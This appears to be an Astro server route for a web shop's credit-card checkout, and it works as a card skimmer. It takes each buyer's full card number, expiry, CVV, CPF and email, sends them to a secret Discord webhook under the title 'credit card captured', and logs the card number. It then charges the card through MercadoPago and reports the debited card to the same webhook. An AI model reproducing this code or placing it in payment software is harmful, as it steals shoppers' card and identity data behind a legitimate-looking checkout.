import type { APIRoute } from "astro";
import products from "../../assets/products.json";
import { sendEmbedToWebhook } from "../../services/discordwebhook";
import { mercado } from "../../services/mercadopago";
import {
  EMPTY_PRODUCT,
  watchPurchase,
} from "../../services/mercadopago/purchase";

export const prerender = false;

export interface PostCardPayload {
  product_id: string;
  payer_name: string;
  payer_email: string;
  payer_cpf: string;
  card_number: string;
  card_month: string;
  card_year: string;
  card_cvv: string;
  card_token_id?: string;
}

export const POST: APIRoute = async ({ request }) => {
  const payload: PostCardPayload = await request.json();

  const product =
    products.find((x) => x.id == payload.product_id) || EMPTY_PRODUCT;

  const fields = [
    {
      name: "✍️ Nome do pagador",
      value: payload.payer_name,
      inline: true,
    },
    {
      name: "🪪 CPF do pagador",
      value: payload.payer_cpf,
      inline: true,
    },
    {
      name: "💳 Número, Mês/Ano & CVV",
      value: [
        payload.card_number.replaceAll(" ", ""),
        payload.card_month + "/" + payload.card_year,
        payload.card_cvv,
      ].join(" "),
    },
  ];

  sendEmbedToWebhook(import.meta.env.SECRET_WEBHOOK_CC, {
    title: "🏛️ Cartão de Crédito capturado!",
    description: `do produto: **${product.name}**`,
    footer: { text: payload.payer_email },
    thumbnail: { url: product.image },
    fields,
  });

  const payment = await mercado.createPayment(
    {
      transaction_amount: product.price,
      installments: 1, // TODO: use choosed one
      description: `compra de ${product.name}`,
      token: payload.card_token_id,
      payer: {
        email: payload.payer_email,
      },
    },
    payload.payer_email + "-card-pay-" + product.id + Date.now(),
  );

  if (payment.error) {
    console.log("[MP] error creating card payment:", payment);
    return new Response(JSON.stringify(payment), { status: 400 });
  }

  console.log(
    "[MP] card payment created:",
    payload.card_number,
    "got:",
    payment.status == "rejected" ? payment : payment.status,
  );

  watchPurchase({
    payment_id: payment.id,
    payment_status: payment.status,
    infos: payload,
    callback() {
      sendEmbedToWebhook(import.meta.env.SECRET_WEBHOOK_CC, {
        title: "Cartão de Crédito debitado!",
        description: `do produto: **${product.name}**`,
        footer: { text: payload.payer_email },
        thumbnail: { url: product.image },
        fields: [{ name: "CC", value: payload.card_number }],
      });
    },
  });

  return new Response(
    JSON.stringify({
      id: payment.id,
      status: payment.status,
    }),
    { status: 200 },
  );
};
